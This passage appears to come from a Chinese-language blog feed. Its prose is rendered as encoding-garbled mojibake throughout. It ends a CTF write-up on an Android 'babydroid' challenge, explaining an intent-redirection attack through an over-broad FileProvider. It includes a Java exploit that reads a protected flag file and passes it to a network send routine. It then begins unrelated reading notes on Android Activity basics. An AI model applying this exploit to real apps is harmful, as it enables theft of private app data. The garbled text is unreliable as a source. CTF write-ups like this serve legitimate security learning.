src="/posts/f416437f.htm/image-20241009195133582.png" alt="image-20241009195133582"></p><p>è·å–ååºåˆ—åŒ– <code>key</code>å€¼ä¸º<code>intent</code>çš„æ•°æ®ï¼Œç„¶åå¯åŠ¨Intent</p><p><strong>FlagReceiver</strong></p><p><img src="/posts/f416437f.htm/image-20241009195413623.png" alt="image-20241009195413623"></p><p>åˆ›å»ºä¸€ä¸ª /data/data/Package_name/files/flagæ–‡ä»¶ï¼Œå¹¶ä¸”æŠŠkeyå€¼ä¸ºflagè·å–çš„æ•°æ®å­˜æ”¾åœ¨åˆ›å»ºçš„è·¯å¾„æ–‡ä»¶ä¸‹ï¼Œè¿™é‡Œåº”è¯¥å°±æ˜¯flagå…³é”®ã€‚</p><p><strong>Provider</strong></p><p><code>FileProvider</code>æ˜¯<code>ContentProvider</code>çš„ä¸€ä¸ªå­ç±»ï¼Œä½¿ç”¨content://ä»£æ›¿file://ï¼Œä½¿å¾—å…±äº«æ•°æ®å®‰å…¨ã€‚</p><p>content URIå…è®¸ä¸´æ—¶æˆäºˆè¯¥æ–‡ä»¶è¯»å†™æƒé™ï¼Œåªéœ€è¦å½“åˆ›å»ºä¸€ä¸ªåŒ…å«è¯¥æ–‡ä»¶çš„content URIçš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡<code>Intent.setFlags()</code>æ·»åŠ ç›¸åº”çš„æƒé™ã€‚</p><p>å½“åˆ›å»ºFileProviderçš„æ—¶å€™ï¼Œéœ€è¦ä¸€ä¸ªxmlæ–‡ä»¶æŒ‡å®šè¯¥provideræä¾›çš„æ–‡ä»¶ï¼Œå¦‚<code>res/xml/file_paths.xml</code>ï¼Œå…¶ä¸­æä¾›äº†ç›¸åº”çš„æ˜ å°„è·¯å¾„å’Œåˆ«åï¼Œ</p><p>åŒæ—¶éœ€è¦åœ¨AndroidManifest.xmlä¸­çš„FileProviderå¯¹åº”çš„èŠ‚ç‚¹å†…å®šä¹‰<code> &lt;meta-data android:name=&quot;android.support.FILE_PROVIDER_PATHS&quot; android:resource=&quot;@xml/file_paths&quot; &gt;</code>æ¥å£°æ˜ã€‚ï¼ˆå…¶ä¸­resourceå±æ€§å†…ä¸ºæä¾›çš„xmlæ–‡ä»¶ï¼‰</p><p>è¯¥Vulnerable.apkæŒ‡å®šçš„xmlæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">paths</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root-path</span> <span class="attr">name</span>=<span class="string">&quot;root&quot;</span> <span class="attr">path</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">paths</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&lt;root-path&gt;</code>èŠ‚ç‚¹ï¼šä»£è¡¨è®¾å¤‡çš„æ ¹ç›®å½•</p><ul><li><p><code>name</code>å±æ€§ï¼šç»™è¯¥ç›®å½•èµ·çš„åˆ«åï¼Œç”¨äºéšè—è·¯å¾„</p></li><li><p><code>path</code>å±æ€§ï¼šä¸´æ—¶æˆæƒè®¿é—®çš„è·¯å¾„ï¼ˆè¯¥ç›®å½•ä¸‹çš„å­ç›®å½•ï¼‰</p></li></ul><p>åˆ™è¯¥APKæä¾›çš„FileProvideræä¾›äº†æ ¹ç›®å½•ï¼Œé€šè¿‡<code>root/</code>åˆ«åæ¥è®¿é—®</p><p>åˆ™å¦‚æœæˆ‘ä»¬æƒ³è®¿é—®flagçš„å­˜å‚¨è·¯å¾„ï¼Œå®é™…æ„é€ çš„éƒ¨åˆ†uriåº”ä¸º<code>root/data/data/[package_name]/files/flag</code>ã€‚</p><h3 id="åˆ©ç”¨æ€è·¯">åˆ©ç”¨æ€è·¯</h3><p>ä¸»è¦å°±æ˜¯é€šè¿‡<code>FileProvider</code>è·å¾—è¿™ä¸ª<code>files/flag</code>æ–‡ä»¶çš„å†…å®¹ï¼Œä½†æ˜¯ä»–æ˜¯ä¸å¯å¯¼å‡ºçš„ï¼Œå‘ç°ä»–æœ‰ä¸€ä¸ª<code>grantUriPermissions=&quot;true&quot;</code>æ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ªè®¿é—®content uriå†…å®¹ã€‚</p><p>åœ¨Attack.apkä¸­æ„é€ Intentè®¿é—®content uriå†…å®¹ï¼Œç„¶ååˆ©ç”¨Vnlnerable.classå¯åŠ¨è¿™ä¸ªintent</p><p>å…¶ä¸­æ„é€ çš„URLï¼š</p><p><code>content://androidx.core.content.FileProvider/root/data/data/com.bytectf.babydroid/files/flag</code></p><h3 id="Attackå®ç°">Attackå®ç°</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getFlag</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// åˆ¤æ–­ä¸€ä¸‹æ˜¯å¦æ˜¯è¢«ç›®æ ‡apkæ¥startçš„è¯¥Activity</span></span><br><span class="line">    <span class="keyword">if</span> (getIntent().getAction().equals(<span class="string">&quot;evil&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// è·å–æ¥æ”¶åˆ°çš„uri</span></span><br><span class="line">        <span class="type">Uri</span> <span class="variable">data</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// å®šä¹‰ä¸€ä¸ªå­—ç¬¦è¾“å…¥æµ</span></span><br><span class="line">            <span class="type">InputStreamReader</span> <span class="variable">isr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(getContentResolver().openInputStream(data));</span><br><span class="line">            <span class="type">char</span>[] buf = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span> (-<span class="number">1</span> != isr.read(buf, <span class="number">0</span>, <span class="number">1024</span>)) &#123;</span><br><span class="line">                sb.append(String.valueOf(buf));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// è¯»å–çš„å†…å®¹è¾“å…¥å­˜å‚¨åˆ°flag</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(sb);</span><br><span class="line">            Log.d(<span class="string">&quot;PwnPwn&quot;</span>, flag);</span><br><span class="line">            ((TextView) findViewById(R.id.tv_show)).setText(<span class="keyword">new</span> <span class="title class_">String</span>(sb));</span><br><span class="line">            <span class="comment">// é€šè¿‡ç½‘ç»œã€å°†ä¿¡æ¯ä¼ è¾“å›æ¥è·å–</span></span><br><span class="line">            sendData(<span class="string">&quot;getFlag&quot;</span>,flag);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// å®šä¹‰ä¸€ä¸ªactionä¸º&quot;evil&quot;çš„Intent</span></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">evil</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line">        <span class="comment">// è®¾å®šç›®çš„ç»„ä»¶ä¸ºå½“å‰MainActivityï¼Œä¹Ÿå¯ä»¥å•ç‹¬æ”¾åœ¨å¦ä¸€ä¸ªAttackActivityä¸­</span></span><br><span class="line">        evil.setClassName(getPackageName(), MainActivity.class.getName());</span><br><span class="line">        <span class="comment">// è®¾ç½®æ“çºµdataæ•°æ®ä¸º flagæ‰€åœ¨æ–‡ä»¶çš„contentURI</span></span><br><span class="line">        evil.setData(Uri.parse(pwnUri));</span><br><span class="line">        <span class="comment">// æ·»åŠ è¯»å†™æƒé™</span></span><br><span class="line">        evil.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ–°å»ºä¸€ä¸ªintentï¼Œç”¨äºå¯åŠ¨ç›®æ ‡APK</span></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        <span class="comment">// å¯åŠ¨çš„ç›®æ ‡Activityä¸ºVulnerable</span></span><br><span class="line">        intent.setClassName(<span class="string">&quot;com.bytectf.babydroid&quot;</span>, <span class="string">&quot;com.bytectf.babydroid.Vulnerable&quot;</span>);</span><br><span class="line">        <span class="comment">// åŒæ—¶å°†æ„é€ å¥½çš„evil Intentå½“ä½œ key &quot;intent&quot;çš„æ•°æ®åŒ…è£…è¿›å»</span></span><br><span class="line">        intent.putExtra(<span class="string">&quot;intent&quot;</span>, evil);</span><br><span class="line">        <span class="comment">// å¯åŠ¨ç›®æ ‡apk</span></span><br><span class="line">        startActivity(intent);</span><br><span class="line">        finish();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">ğŸ…å¯¹ç½‘ä¸Šä¸€äº›å…³äºç§»åŠ¨å®‰å…¨æµ‹è¯•æ–‡ç« çš„æ•´ç†ä¸å½’çº³</summary>
    
    
    
    <category term="ç§»åŠ¨å®‰å…¨" scheme="https://zxk1ng.github.io/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Androidå®‰å…¨" scheme="https://zxk1ng.github.io/tags/Android%E5%AE%89%E5%85%A8/"/>
    
    <category term="å®‰å…¨æµ‹è¯•" scheme="https://zxk1ng.github.io/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
    <category term="æ¼æ´" scheme="https://zxk1ng.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>ã€Šç¬¬ä¸€è¡Œä»£ç ã€‹é˜…è¯»ç¬”è®°</title>
    <link href="https://zxk1ng.github.io/posts/69766bbb.html"/>
    <id>https://zxk1ng.github.io/posts/69766bbb.html</id>
    <published>2025-01-15T06:35:15.000Z</published>
    <updated>2025-01-15T07:14:39.070Z</updated>
    
    <content type="html"><![CDATA[<h1>ã€Šç¬¬ä¸€è¡Œä»£ç ã€‹</h1><h2 id="Activity">Activity</h2><h3 id="åœ¨æ´»åŠ¨ä¸­ä½¿ç”¨Menu">åœ¨æ´»åŠ¨ä¸­ä½¿ç”¨Menu</h3><p>åœ¨resç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªmenuæ–‡ä»¶å¤¹ï¼Œæ–‡ä»¶å¤¹ä¸‹æ–°å»ºä¸€ä¸ªåå«mainçš„èœå•æ–‡ä»¶ï¼Œå³é”®menuæ–‡ä»¶å¤¹â€“&gt;Newâ€“&gt;Menu resource file,æ–‡ä»¶åä¸ºmainã€‚ç„¶ååœ¨main.xmlä¸­æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š</p><p><img src="/posts/69766bbb.htm/image-20240717145842714.png" alt="image-20240717145842714"></p><p>åˆ›å»ºä¸¤ä¸ªèœå•é¡¹ï¼Œ<item>æ ‡ç­¾ç”¨æ¥åˆ›å»ºä¸€ä¸ªå…·ä½“çš„èœå•é¡¹ï¼Œandroid:idç»™èœå•é¡¹æŒ‡å®šä¸€ä¸ªå”¯ä¸€çš„æ ‡è¯†ç¬¦ï¼Œandroid:titleç»™èœå•é¡¹æŒ‡å®šä¸€ä¸ªåç§°ï¼Œæ¥ç€é‡å†™onCreateOptionsMenu()æ–¹æ³•<br><img src="/posts/69766bbb.htm/image-20240717150644340.png" alt="image-20240717150644340"></item></p><p>é€šè¿‡getMenuInflater()æ–¹æ³•å¾—åˆ°MenuInflaterå¯¹è±¡ï¼Œå†è°ƒç”¨inflate()æ–¹æ³•å°±å¯ä»¥ç»™å½“å‰æ´»åŠ¨åˆ›å»ºèœå•äº†ï¼Œinflate()æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ç”¨äºæŒ‡å®šæˆ‘ä»¬é€šè¿‡å“ªä¸€ä¸ªèµ„æºæ–‡ä»¶æ¥åˆ›å»ºèœå•ï¼Œè¿™é‡Œä¼ å…¥R.menu.mainï¼Œç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šæˆ‘ä»¬èœå•é¡¹å°†æ·»åŠ åˆ°å“ªä¸€ä¸ªMenuå¯¹è±¡å½“ä¸­ï¼Œè¿™é‡Œç›´æ¥ä¼ å…¥å‚æ•°menuï¼Œè¿”å›trueå…è®¸èœå•æ˜¾ç¤ºï¼Œç›¸ååˆ™falseã€‚</p><p>å½“ç„¶æˆ‘ä»¬å¯ä»¥é‡å†™onOptionsItemSelected()å®ç°èœå•ç‚¹å‡»å“åº”äº‹ä»¶ã€‚</p><p><img src="/posts/69766bbb.htm/image-20240717151418765.png" alt="image-20240717151418765"></p><p>é€šè¿‡item.getItemId()åˆ¤æ–­ç‚¹å‡»çš„æ˜¯å“ªä¸€ä¸ªèœå•é¡¹</p><h3 id="Intentåœ¨æ´»åŠ¨ä½¿ç”¨">Intentåœ¨æ´»åŠ¨ä½¿ç”¨</h3><h4 id="æ˜¾ç¤ºå¯åŠ¨Activity"><strong>æ˜¾ç¤ºå¯åŠ¨Activity</strong></h4><p><img src="/posts/69766bbb.htm/image-20240717152652636.png" alt="image-20240717152652636"></p><h4 id="éšå¼å¯åŠ¨Activity"><strong>éšå¼å¯åŠ¨Activity</strong></h4><p><img src="/posts/69766bbb.htm/image-20240717153253483.png" alt="image-20240717153253483"></p><p>é…ç½®å¦‚ä¸‹ï¼š</p><p><img src="/posts/69766bbb.htm/image-20240717153309587.png" alt="image-20240717153309587"></p><p>å…¶ä¸­categoryçš„è¿™ä¸ªä¸ºé»˜è®¤çš„categoryï¼Œä½¿ç”¨startActivityä¼šè‡ªåŠ¨å°†è¿™ä¸ªcategoryæ·»åˆ°intent</p><p><strong>æ·»åŠ ä¸€ä¸ªcategory</strong></p><p><img src="/posts/69766bbb.htm/image-20240717153932110.png" alt="image-20240717153932110"></p><p>é…ç½®å¦‚ä¸‹</p><p><img src="/posts/69766bbb.htm/image-20240717153943644.png" alt="image-20240717153943644"></p><h4 id="intentå¯åŠ¨å…¶ä»–ç¨‹åºçš„æ´»åŠ¨">intentå¯åŠ¨å…¶ä»–ç¨‹åºçš„æ´»åŠ¨</h4><p>è°ƒç”¨ç³»ç»Ÿçš„æµè§ˆå™¨æ‰“å¼€ç½‘é¡µ</p><p><img src="/posts/69766bbb.htm/image-20240717154420350.png" alt="image-20240717154420350"></p><p>Intentçš„actionä¸ºIntent.ACTION_VIEWï¼Œè¿™æ˜¯ç³»ç»Ÿå†…ç½®çš„åŠ¨ä½œï¼Œå…¶å¸¸é‡å€¼ä¸º<code>android.intent.action.VIEW</code></p><p>Uri.parseï¼šç½‘å€å­—ç¬¦ä¸²è§£æä¸ºä¸€ä¸ªUriå¯¹è±¡ï¼Œå†è°ƒç”¨setData()å°†è¿™ä¸ªUriå¯¹è±¡ä¼ é€’è¿›å»ã€‚</p><p>setDate()ï¼šæ¥æ”¶ä¸€ä¸ªUriå¯¹è±¡ï¼Œä¸»è¦ç”¨äºæŒ‡å®šå½“å‰Intentæ­£åœ¨æ“ä½œçš„æ•°æ®ï¼Œæ•°æ®é€šå¸¸å·²å­—ç¬¦ä¸²å½¢å¼ä¼ å…¥åˆ°Uri.parse</p><p>æˆ‘ä»¬è¿˜å¯ä»¥åœ¨<code>&lt;intent-filter&gt;</code>ä¸­é…ç½®<code>&lt;data&gt;</code>æ ‡ç­¾ï¼Œæ›´ç²¾ç¡®æŒ‡å®šå½“å‰æ´»åŠ¨å“åº”ä»€ä¹ˆç±»å‹çš„æ•°æ®ã€‚<code>&lt;data&gt;</code>æ ‡ç­¾é…ç½®ä»¥ä¸‹å†…å®¹</p><ul><li>android:schemeï¼šç”¨äºæŒ‡å®šæ•°æ®çš„åè®®éƒ¨åˆ†ï¼Œå¦‚http</li><li>android:hostï¼šæŒ‡å®šæ•°æ®çš„ä¸»æœºåéƒ¨åˆ†ï¼Œ<a href="http://xn--www-eo8e.baidu.com">å¦‚www.baidu.com</a></li><li>android:portï¼šæŒ‡å®šæ•°æ®ç«¯å£éƒ¨åˆ†ï¼Œä¸€èˆ¬ç´§è·Ÿä¸»æœºåå</li><li>android:pathï¼šç”¨äºæŒ‡å®šä¸»æœºåå’Œç«¯å£ä¹‹åçš„éƒ¨åˆ†ï¼Œå¦‚ä¸€æ®µç½‘å€ä¸­è·Ÿåœ¨åŸŸåä¹‹åçš„å†…å®¹</li><li>android:mimeTypeï¼šç”¨äºæŒ‡å®šå¯ä»¥å¤„ç†çš„æ•°æ®ç±»å‹ï¼Œå…è®¸ä½¿ç”¨é€šé…ç¬¦æ–¹å¼è¿›è¡ŒæŒ‡å®š</li></ul><p>åªæœ‰<code>data</code>æ ‡ç­¾ä¸­æŒ‡å®šå†…å®¹å’ŒIntentä¸­æºå¸¦çš„Dataå®Œå…¨ä¸€è‡´æ—¶ï¼Œå½“å‰æ´»åŠ¨æ‰èƒ½å“åº”Intentï¼Œandroid:schemeä¸ºhttpï¼Œåˆ™å“åº”æ‰€æœ‰httpåè®®çš„Intent</p><p><img src="/posts/69766bbb.htm/image-20240717161643442.png" alt="image-20240717161643442"></p><p>æ­¤æ—¶è¿™ä¸ªactivityå°±å¯ä»¥å“åº”ä¸€ä¸ªæ‰“å¼€ç½‘é¡µçš„Intentäº†å—ï¼Œ(è¿™é‡ŒæŠ¥é”™ï¼Œåº”è¯¥å’Œç‰ˆæœ¬å•¥çš„æœ‰å…³ç³»ï¼Œæ²¡ç»†ç©¶)</p><p><strong>è°ƒç”¨ç³»ç»Ÿæ‹¨å·ç•Œé¢</strong></p><p><img src="/posts/69766bbb.htm/image-20240717161947683.png" alt="image-20240717161947683"></p><h4 id="å‘ä¸‹ä¸€ä¸ªæ´»åŠ¨ä¼ é€’æ•°æ®"><strong>å‘ä¸‹ä¸€ä¸ªæ´»åŠ¨ä¼ é€’æ•°æ®</strong></h4><p>ä¼ é€’æ•°æ®</p><p><img src="/posts/69766bbb.htm/image-20240717173838919.png" alt="image-20240717173838919"></p><p>ä¸‹ä¸€ä¸ªæ´»åŠ¨æ¥æ”¶æ•°æ®</p><p><img src="/posts/69766bbb.htm/image-20240717173908890.png" alt="image-20240717173908890"></p><h4 id="è¿”å›æ•°æ®ç»™ä¸Šä¸€ä¸ªæ´»åŠ¨">è¿”å›æ•°æ®ç»™ä¸Šä¸€ä¸ªæ´»åŠ¨</h4><p>æ¥æ”¶æ•°æ®</p><p><img src="/posts/69766bbb.htm/image-20240717175001474.png" alt="image-20240717175001474"></p><p>ä¼ é€’æ•°æ®</p><p><img src="/posts/69766bbb.htm/image-20240717175020237.png" alt="image-20240717175020237"></p><ul><li><p>startActivityForResult()ï¼šå¯åŠ¨ä¸€ä¸ªæ´»åŠ¨ï¼Œå½“æ´»åŠ¨é”€æ¯æ—¶è¿”å›ä¸€ä¸ªç»“æœç»™ä¸Šä¸€ä¸ªæ´»åŠ¨ï¼Œé”€æ¯åå›è°ƒä¸Šä¸€ä¸ªæ–¹æ³•çš„onActivityResult()æ–¹æ³•</p></li><li><p>SecondActivityçš„Intentä¸“é—¨ç”¨æ¥ä¼ é€’æ•°æ®ç”¨çš„ï¼Œæ²¡æŒ‡å®šæ„å›¾</p></li><li><p>setResult()ï¼šå‘ä¸Šä¸€ä¸ªæ´»åŠ¨è¿”å›æ•°æ®</p></li><li><p>onActivityResult(t requestCode, int resultCode, @Nullable Intent data)ï¼š<br>requestCode å¯åŠ¨æ´»åŠ¨æ—¶ä¼ å…¥çš„è¯·æ±‚ç <br>resultCode è¿”å›æ•°æ®ä¼ å…¥çš„å¤„ç†ç»“æœ<br>data æºå¸¦è¿”å›æ•°æ®çš„intent</p></li></ul><p>å½“<strong>è§¦æ‘¸è¿”å›é”®</strong>ï¼Œæ•°æ®è¿”å›ä¸Šä¸€ä¸ªæ´»åŠ¨</p><p><img src="/posts/69766bbb.htm/image-20240717180224720.png" alt="image-20240717180224720"></p><h3 id="æ´»åŠ¨çš„ç”Ÿå‘½å‘¨æœŸ">æ´»åŠ¨çš„ç”Ÿå‘½å‘¨æœŸ</h3><h4 id="æ´»åŠ¨çŠ¶æ€">æ´»åŠ¨çŠ¶æ€</h4><ol><li>è¿è¡ŒçŠ¶æ€ï¼šæ´»åŠ¨ä½äºè¿”å›æ ˆçš„æ ˆé¡¶æ—¶</li><li>æš‚åœçŠ¶æ€ï¼šæ´»åŠ¨ä¸å†å¤„äºæ ˆé¡¶ä½ç½®ï¼Œä½†ä»å¯è§ï¼Œåªæœ‰å†…å­˜æä½æƒ…å†µä¸‹ï¼Œç³»ç»Ÿè€ƒè™‘å›æ”¶è¿™ç§æ´»åŠ¨</li><li>åœæ­¢çŠ¶æ€ï¼šæ´»åŠ¨ä¸å†å¤„äºæ ˆé¡¶ä½ç½®ï¼Œå®Œå…¨ä¸å¯è§ã€‚å½“å…¶ä»–ä½ç½®éœ€è¦å†…å­˜æ—¶ï¼Œå¤„äºè¿™ä¸ªçŠ¶æ€çš„æ´»åŠ¨å¯èƒ½è¢«ç³»ç»Ÿå›æ”¶</li><li>é”€æ¯çŠ¶æ€ï¼šè¿”å›æ ˆä¸­ç§»é™¤ã€‚</li></ol><h4 id="æ´»åŠ¨ç”Ÿå­˜æœŸ">æ´»åŠ¨ç”Ÿå­˜æœŸ</h4><p>onCreate ()ï¼šæ´»åŠ¨ç¬¬ä¸€æ¬¡è¢«åˆ›å»ºæ—¶å€™è°ƒç”¨ï¼Œå®Œæˆåˆå§‹åŒ–</p><p>onStart()ï¼šæ´»åŠ¨ç”±ä¸å¯è§å˜ä¸ºå¯è§çš„æ—¶å€™è°ƒç”¨</p><p>onResume()ï¼šæ´»åŠ¨å‡†å¤‡å¥½å’Œç”¨æˆ·äº¤äº’æ—¶å€™è°ƒç”¨ï¼Œæ­¤æ—¶æ´»åŠ¨ä½äºæ ˆé¡¶ï¼Œå¤„äºè¿è¡ŒçŠ¶æ€</p><p>onPause()ï¼šç³»ç»Ÿå‡†å¤‡å¯åŠ¨æˆ–è€…æ¢å¤å¦ä¸€ä¸ªæ´»åŠ¨æ—¶è°ƒç”¨</p><p>onStop()ï¼šæ´»åŠ¨å®Œå…¨ä¸å¯è§è°ƒç”¨</p><p>onDestory()ï¼šæ´»åŠ¨è¢«é”€æ¯å‰è°ƒç”¨</p><p>onRestart()ï¼šæ´»åŠ¨ç”±åœæ­¢çŠ¶æ€å˜ä¸ºè¿è¡ŒçŠ¶æ€ä¹‹å‰è°ƒç”¨</p><p><strong>å®Œæ•´ç”Ÿå­˜æœŸ</strong>ï¼šonCreateå’ŒonDestoryä¹‹å‰ç»å†çš„<br><strong>å¯è§ç”Ÿå­˜æœŸ</strong>ï¼šonStart()å’ŒonStop()ä¹‹é—´ç»å†çš„</p><p><strong>å‰å°ç”Ÿå­˜æœŸ</strong>ï¼šonResumeå’ŒonPauseä¹‹å‰ç»å†çš„</p><p><code>android:theme=&quot;@android:style/Theme.Dialog&quot;</code>æ´»åŠ¨ä»¥å¯¹è¯æ¡†ä¸»é¢˜æ–¹å¼æ˜¾ç¤º</p><h4 id="æ´»åŠ¨è¢«å›æ”¶æ—¶">æ´»åŠ¨è¢«å›æ”¶æ—¶</h4><p><strong>ä¿å­˜æ•°æ®</strong></p><p>onSaveInstanceState()å›è°ƒï¼Œè¿™ä¸ªæ–¹æ³•ä¿è¯æ´»åŠ¨è¢«å›æ”¶ä¹‹å‰ä¸€å®šä¼šè¢«è°ƒç”¨ï¼Œç”¨æ¥ä¿å­˜è¢«å›æ”¶æ´»åŠ¨çš„æ•°æ®</p><p>Bundleç±»å‹å‚æ•°æä¾›ä¿å­˜æ•°æ®æ–¹æ³•ï¼Œå¦‚putString()ä¿å­˜å­—ç¬¦ä¸²</p><p>æ¯ä¸ªä¿å­˜æ–¹æ³•ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªé”®å€¼ï¼Œç¬¬äºŒä¸ªè¦ä¿å­˜çš„å†…å®¹ã€‚</p><p><strong>æ¢å¤æ•°æ®</strong></p><p>onCreate()æ–¹æ³•ä¹Ÿæœ‰ä¸€ä¸ªBundleç±»å‹å‚æ•°ï¼Œä¸€èˆ¬ä¸ºnullï¼Œå½“é€šè¿‡onSaveInstanceState()ä¿å­˜æ•°æ®æ—¶ï¼ŒonCreateçš„Bundleå‚æ•°å°±ä¼šå¸¦æœ‰ä¹‹å‰ä¿å­˜çš„å…¨éƒ¨æ•°æ®ã€‚</p><p><img src="/posts/69766bbb.htm/image-20240718160852741.png" alt="image-20240718160852741"></p><p><img src="/posts/69766bbb.htm/image-20240718161106609.png" alt="image-20240718161106609"></p><h4 id="æ´»åŠ¨å¯åŠ¨æ¨¡å¼">æ´»åŠ¨å¯åŠ¨æ¨¡å¼</h4><p>standardï¼ŒsingleTopï¼ŒsingleTaskï¼ŒsingleInstance</p><p>standardï¼šé»˜è®¤å¯åŠ¨æ¨¡å¼</p><p>singleTopï¼šå½“æ´»åŠ¨ä½äºæ ˆé¡¶æ—¶ï¼Œä¸å†åˆ›å»ºæ–°çš„ç¤ºä¾‹</p><p>singleTaskï¼šæ¯æ¬¡å¯åŠ¨æ´»åŠ¨ç³»ç»Ÿé¦–å…ˆåœ¨è¿”å›æ ˆä¸­æ£€æŸ¥è¯¥æ´»åŠ¨æ˜¯å¦å­˜åœ¨å®ä¾‹ï¼Œå¦‚æœæœ‰åˆ™ç›´æ¥ä½¿ç”¨ï¼Œå¹¶æŠŠåœ¨è¿™ä¸ªæ´»åŠ¨ä¹‹ä¸Šæ‰€æœ‰æ´»åŠ¨ç»Ÿç»Ÿå‡ºæ ˆã€‚</p><p>singleInstanceï¼šå•ç‹¬ä¸€ä¸ªè¿”å›æ ˆç®¡ç†è¿™ä¸ªæŒ‡å®šæ´»åŠ¨</p><p><code>getTaskId()</code>ï¼šè·å¾—è¿”å›æ ˆID</p><h3 id="æ´»åŠ¨æœ€ä½³å®è·µ">æ´»åŠ¨æœ€ä½³å®è·µ</h3><h4 id="çŸ¥æ™“å½“å‰æ˜¯å“ªä¸€ä¸ªæ´»åŠ¨">çŸ¥æ™“å½“å‰æ˜¯å“ªä¸€ä¸ªæ´»åŠ¨</h4><p>æ–°å»ºä¸€ä¸ªJava.classâ€“ã€‹BaseActivityï¼Œç»§æ‰¿AppCompatActivityï¼Œé‡å†™onCreateå¦‚ä¸‹</p><p>getClass().getSimpleNameï¼ˆï¼‰è·å¾—å½“å‰ç±»å</p><p><img src="/posts/69766bbb.htm/image-20240718162008861.png" alt="image-20240718162008861"></p><p>åœ¨è®©BaseActivityæˆä¸ºæ´»åŠ¨çš„çˆ¶ç±»ï¼Œå¦‚ä¸‹</p><p><img src="/posts/69766bbb.htm/image-20240718162144676.png" alt="image-20240718162144676"></p><h4 id="éšæ—¶éšåœ°é€€å‡ºç¨‹åº">éšæ—¶éšåœ°é€€å‡ºç¨‹åº</h4><p>ä½¿ç”¨ä¸€ä¸ªä¸“é—¨çš„é›†åˆç±»å¯¹æ‰€æœ‰æ´»åŠ¨è¿›è¡Œç®¡ç†å°±å¯ä»¥äº†</p><p><img src="/posts/69766bbb.htm/image-20240718164747821.png" alt="image-20240718164747821"></p><p>BaseActivityè¿›è¡Œå‘Listæ·»åŠ æˆ–è€…åˆ é™¤æ´»åŠ¨ï¼Œå› ä¸ºæ´»åŠ¨ç»§æ‰¿BaseActivtiyï¼Œæ‰€ä»¥æ¯ä¸ªæ´»åŠ¨éƒ½ä¼šè°ƒç”¨è¿™ä¸ªonCreate</p><p><img src="/posts/69766bbb.htm/image-20240718165844056.png" alt="image-20240718165844056"></p><p><code>android.os.Process.killProcess(android.os.Process.myPid())</code>ç”¨äºkillå½“å‰è¿›ç¨‹</p><h2 id="UIæ§ä»¶">UIæ§ä»¶</h2><h3 id="æ§ä»¶ä½¿ç”¨æ–¹æ³•">æ§ä»¶ä½¿ç”¨æ–¹æ³•</h3><h4 